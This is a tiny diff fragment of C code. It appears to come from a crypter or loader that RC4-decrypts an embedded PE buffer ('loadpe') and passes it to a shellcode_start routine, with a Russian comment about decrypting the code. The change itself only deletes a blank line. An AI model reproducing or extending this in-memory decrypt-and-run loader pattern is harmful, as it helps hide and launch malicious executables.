@@ -115,6 +115,5 @@ int main()
 
 	//Тут будет расшифровка кода
 	decRC4(key_to_dec, 4, loadpe, sizeof(loadpe)-1);
-
 	shellcode_start(loadpe, data_protect, sizeof(loadpe), sizeof(data_protect));
 }
